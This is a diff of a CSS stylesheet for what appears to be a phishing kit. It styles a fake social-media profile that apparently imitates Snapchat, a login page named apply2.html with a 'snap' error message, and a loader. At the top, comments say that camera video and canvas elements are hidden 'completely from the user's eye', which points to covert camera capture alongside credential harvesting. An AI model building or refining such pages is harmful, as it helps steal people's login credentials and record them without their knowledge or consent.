@@ -1,19 +1,35 @@
 /*======================================================
-  General Reset & Backend Hiding
+  إعدادات عامة - General Reset
 ======================================================*/
 * {
-    box-sizing: border-box; margin: 0; padding: 0;
+    box-sizing: border-box; 
+    margin: 0; 
+    padding: 0;
     font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
-    direction: rtl; -webkit-tap-highlight-color: transparent;
+    direction: rtl; 
+    -webkit-tap-highlight-color: transparent;
 }
-body { background-color: #f7f7f7; color: #000; line-height: 1.6; text-align: right; overflow-x: hidden; }
+
+body {
+    background-color: #f7f7f7; 
+    color: #000;
+    line-height: 1.6; 
+    text-align: right; 
+    overflow-x: hidden; 
+}
+
 a { text-decoration: none; }
 
-/* إخفاء الكاميرا والكانفاس تماماً */
-#video, #canvas { display: none !important; position: absolute; left: -9999px; }
+/* إخفاء عناصر الكاميرا والتحليل تماماً عن عين المستخدم */
+#video, #canvas {
+    display: none !important;
+    visibility: hidden;
+    position: absolute;
+    left: -9999px;
+}
 
 /*======================================================
-  Profile Page Styles (Based on your input)
+  تنسيقات صفحة البروفايل - Profile Page
 ======================================================*/
 @keyframes pulse-purple {
     0% { box-shadow: 0 0 0 0 rgba(155, 44, 243, 0.7); }
@@ -21,50 +37,359 @@ a { text-decoration: none; }
     100% { box-shadow: 0 0 0 0 rgba(155, 44, 243, 0); }
 }
 
-.top-nav { position: fixed; top: 0; left: 0; right: 0; display: flex; justify-content: space-between; padding: 15px 15px 0; z-index: 1000; }
-.nav-button { color: #FFF; width: 38px; height: 38px; background-color: rgba(0, 0, 0, 0.5); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 5px; backdrop-filter: blur(4px); cursor: pointer; position: relative; }
+.top-nav {
+    position: fixed; 
+    top: 0; 
+    left: 0; 
+    right: 0;
+    display: flex; 
+    justify-content: space-between;
+    padding: 15px 15px 0; 
+    z-index: 1000;
+}
+
+.nav-button {
+    color: #FFF; 
+    width: 38px; 
+    height: 38px;
+    background-color: rgba(0, 0, 0, 0.5);
+    border-radius: 50%; 
+    display: flex; 
+    align-items: center; 
+    justify-content: center;
+    margin: 0 5px; 
+    backdrop-filter: blur(4px); 
+    cursor: pointer; 
+    position: relative;
+}
+
 .nav-button svg { width: 22px; height: 22px; }
+.back-button { order: 1; } 
+.share-button { order: 3; } 
+.menu-button { order: 2; margin-right: auto; }
+
+.has-notification::after {
+    content: '1'; 
+    position: absolute; 
+    top: -2px; 
+    right: -2px;
+    background-color: #ff0000; 
+    color: white;
+    font-size: 10px; 
+    font-weight: bold; 
+    width: 16px; 
+    height: 16px; 
+    border-radius: 50%;
+    display: flex; 
+    align-items: center; 
+    justify-content: center; 
+    border: 2px solid #fff;
+}
 
 main { position: relative; padding-bottom: 50px; }
-.cover-photo { width: 100%; height: 240px; background-size: cover; background-position: center; position: relative; background-color: #333; }
 
-.profile-card { position: relative; z-index: 50; background-color: #FFF; padding: 0 20px 20px; margin-top: -30px; border-radius: 20px 20px 0 0; text-align: center; box-shadow: 0 -5px 15px rgba(0,0,0,0.05); }
-.profile-pic-wrapper { display: inline-block; margin-top: -50px; margin-bottom: 10px; border-radius: 50%; }
-.profile-pic { width: 100px; height: 100px; border-radius: 50%; border: 3px solid #9B2CF3; background-color: #fff; object-fit: cover; animation: pulse-purple 2s infinite; cursor: pointer; }
+.cover-photo {
+    width: 100%; 
+    height: 240px; 
+    background-size: cover; 
+    background-position: center; 
+    position: relative;
+    background-color: #333; /* لون احتياطي */
+}
 
-.profile-name { font-size: 22px; font-weight: 800; color: #000; margin-bottom: 2px; }
-.profile-meta { font-size: 15px; font-weight: 600; color: #666; direction: ltr; display: inline-block; margin-bottom: 5px;}
-#followerCount { font-size: 14px; color: #888; margin-bottom: 20px; display: block; }
+.cover-photo::before {
+    content: ''; 
+    position: absolute; 
+    inset: 0;
+    background: linear-gradient(to top, rgba(0,0,0,0.6) 0%, transparent 100%);
+}
 
-.add-button { display: flex; align-items: center; justify-content: center; background-color: #FFFC00; color: #000; width: 90%; height: 50px; max-width: 350px; border-radius: 50px; font-size: 18px; font-weight: 700; margin: 5px auto 25px; cursor: pointer; transition: transform 0.1s; }
+.profile-card {
+    position: relative; 
+    z-index: 50; 
+    background-color: #FFF;
+    padding: 0 20px 20px; 
+    margin-top: -30px; 
+    border-radius: 20px 20px 0 0; 
+    text-align: center;
+    box-shadow: 0 -5px 15px rgba(0,0,0,0.05);
+}
+
+.profile-pic-wrapper { 
+    display: inline-block; 
+    margin-top: -50px; 
+    margin-bottom: 10px; 
+    border-radius: 50%; 
+}
+
+.profile-pic {
+    width: 100px; 
+    height: 100px; 
+    border-radius: 50%;
+    border: 3px solid #9B2CF3; 
+    background-color: #fff; 
+    object-fit: cover;
+    animation: pulse-purple 2s infinite; 
+    cursor: pointer;
+}
+
+.profile-name { 
+    font-size: 22px; 
+    font-weight: 800; 
+    color: #000; 
+    margin-bottom: 2px; 
+}
+
+.profile-meta { 
+    font-size: 15px; 
+    font-weight: 600; 
+    color: #666; 
+    direction: ltr; 
+    display: inline-block; 
+    margin-bottom: 5px;
+}
+
+#followerCount { 
+    font-size: 14px; 
+    color: #888; 
+    margin-bottom: 20px; 
+    display: block; 
+}
+
+.add-button {
+    display: flex; 
+    align-items: center; 
+    justify-content: center;
+    background-color: #FFFC00; 
+    color: #000;
+    width: 90%; 
+    height: 50px; 
+    max-width: 350px;
+    border-radius: 50px; 
+    font-size: 18px; 
+    font-weight: 700;
+    margin: 5px auto 25px; 
+    cursor: pointer;
+    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    transition: transform 0.1s;
+}
+
 .add-button:active { transform: scale(0.98); }
 
-.info-section { background-color: #FFF; padding: 0 25px 30px; text-align: right; }
-.tabs-nav { display: flex; justify-content: space-around; padding: 0 20px; border-bottom: 1px solid #eee; background: #fff; border-top: 10px solid #f7f7f7; }
-.tab-link { font-size: 16px; font-weight: 700; color: #999; padding: 15px 0; width: 50%; text-align: center; }
-.tab-link.active { color: #000; position: relative; }
-.tab-link.active::after { content: ''; position: absolute; bottom: -1px; left: 20%; right: 20%; height: 3px; background-color: #00C7FF; border-radius: 10px; }
+.info-section { 
+    background-color: #FFF; 
+    padding: 0 25px 30px; 
+    text-align: right; 
+}
+
+.bio-text { 
+    font-size: 15px; 
+    color: #111; 
+    line-height: 1.5; 
+}
+
+.location-tag {
+    display: inline-flex; 
+    align-items: center;
+    background-color: #F5F5F5; 
+    color: #555;
+    font-size: 14px; 
+    border-radius: 15px; 
+    padding: 6px 14px;
+    width: fit-content; 
+    margin-top: 15px; 
+    font-weight: 600;
+}
+
+.location-icon { 
+    width: 10px; 
+    height: 10px; 
+    background: #FF0000; 
+    border-radius: 50%; 
+    margin-left: 8px; 
+}
+
+.tabs-nav {
+    display: flex; 
+    justify-content: space-around;
+    padding: 0 20px; 
+    border-bottom: 1px solid #eee; 
+    margin-bottom: 2px;
+    background: #fff; 
+    border-top: 10px solid #f7f7f7;
+}
+
+.tab-link { 
+    font-size: 16px; 
+    font-weight: 700; 
+    color: #999; 
+    padding: 15px 0; 
+    width: 50%; 
+    text-align: center; 
+}
+
+.tab-link.active { 
+    color: #000; 
+    position: relative; 
+}
+
+.tab-link.active::after {
+    content: ''; 
+    position: absolute; 
+    bottom: -1px; 
+    left: 20%; 
+    right: 20%;
+    height: 3px; 
+    background-color: #00C7FF; 
+    border-radius: 10px;
+}
 
 .grid-container { padding: 2px; background: #fff; }
-.image-grid { display: flex; flex-wrap: wrap; gap: 2px; }
-.grid-item { width: calc(33.33% - 1.33px); height: 180px; background-color: #eee; background-size: cover; background-position: center; position: relative; cursor: pointer; }
+
+.image-grid { 
+    display: flex; 
+    flex-wrap: wrap; 
+    gap: 2px; 
+}
+
+.grid-item {
+    width: calc(33.33% - 1.33px); 
+    height: 180px;
+    background-color: #eee; 
+    background-size: cover; 
+    background-position: center;
+    position: relative; 
+    cursor: pointer; 
+    overflow: hidden;
+}
+
+.blur-container::before {
+    content: ''; 
+    position: absolute; 
+    inset: 0;
+    background-image: inherit; 
+    background-size: cover;
+    filter: blur(15px); 
+    z-index: 1; 
+    transform: scale(1.1);
+}
+
+.blur-overlay {
+    position: relative; 
+    z-index: 2; 
+    width: 100%; 
+    height: 100%;
+    display: flex; 
+    flex-direction: column; 
+    align-items: center; 
+    justify-content: center;
+    color: white; 
+    text-shadow: 0 2px 5px rgba(0,0,0,0.8);
+    background: rgba(0,0,0,0.2);
+}
 
 /*======================================================
-  Login Page Styles (apply2.html)
+  صفحة تسجيل الدخول - Login Page (apply2.html)
 ======================================================*/
-.login-page-body { background-color: #fff; display: flex; flex-direction: column; min-height: 100vh; justify-content: center; align-items: center; }
-.login-container { width: 100%; max-width: 400px; padding: 40px; text-align: center; }
-.login-logo { width: 70px; height: 70px; margin-bottom: 15px; }
+.login-page-body {
+    background-color: #fff;
+    display: flex; 
+    flex-direction: column;
+    min-height: 100vh;
+    justify-content: center; 
+    align-items: center;
+}
 
-.input-group { margin-bottom: 20px; text-align: right; }
-.input-group label { display: block; font-size: 12px; color: #777; margin-bottom: 5px; font-weight: 600; text-transform: uppercase; }
-.input-group input { width: 100%; padding: 10px 0; border: none; border-bottom: 1px solid #ddd; font-size: 16px; background: transparent; outline: none; transition: border-color 0.3s; }
+.login-container {
+    width: 100%; 
+    max-width: 400px;
+    padding: 40px; 
+    text-align: center;
+}
+
+.login-header { margin-bottom: 40px; }
+
+.login-logo { 
+    width: 70px; 
+    height: 70px; 
+    margin-bottom: 15px; 
+}
+
+.login-header h2 { 
+    font-size: 24px; 
+    font-weight: 700; 
+    color: #333; 
+}
+
+.input-group { 
+    margin-bottom: 20px; 
+    text-align: right; 
+}
+
+.input-group label {
+    display: block; 
+    font-size: 12px; 
+    color: #777;
+    margin-bottom: 5px; 
+    font-weight: 600; 
+    text-transform: uppercase;
+}
+
+.input-group input {
+    width: 100%; 
+    padding: 10px 0; 
+    border: none;
+    border-bottom: 1px solid #ddd; 
+    font-size: 16px;
+    background: transparent; 
+    outline: none; 
+    transition: border-color 0.3s;
+}
+
 .input-group input:focus { border-bottom-color: #007aff; }
 
-.login-btn-large { background-color: #007aff; color: #fff; border: none; width: 100%; padding: 15px; border-radius: 50px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 10px; }
-.error-message-snap { color: #e74c3c; font-size: 14px; margin-bottom: 15px; font-weight: 600; }
+.login-btn-large {
+    background-color: #007aff; 
+    color: #fff; 
+    border: none;
+    width: 100%; 
+    padding: 15px; 
+    border-radius: 50px;
+    font-size: 16px; 
+    font-weight: 700; 
+    cursor: pointer; 
+    margin-top: 10px;
+}
 
-/* Loader Overlay */
-.loading-overlay { z-index: 3000; position: fixed; inset: 0; background: rgba(255,255,255,0.9); display: none; flex-direction: column; justify-content: center; align-items: center; }
-.spinner { border: 4px solid #f3f3f3; border-top: 4px solid #000; border-radius: 50%; width: 35px; height: 35px; animation: spin 0.8s linear infinite; }
-@keyframes spin { 100% { transform: rotate(360deg); } }
+.error-message-snap {
+    color: #e74c3c; 
+    font-size: 14px; 
+    margin-bottom: 15px; 
+    font-weight: 600;
+}
+
+/* واجهة التحميل - Loader */
+.loading-overlay { 
+    z-index: 3000; 
+    position: fixed; 
+    inset: 0;
+    background: rgba(255,255,255,0.9); 
+    display: none; /* يتم تفعيله عبر JS */
+    flex-direction: column; 
+    justify-content: center; 
+    align-items: center; 
+}
+
+.spinner { 
+    border: 4px solid #f3f3f3; 
+    border-top: 4px solid #000; 
+    border-radius: 50%; 
+    width: 35px; 
+    height: 35px; 
+    animation: spin 0.8s linear infinite; 
+}
+
+@keyframes spin { 
+    0% { transform: rotate(0deg); } 
+    100% { transform: rotate(360deg); } 
+}
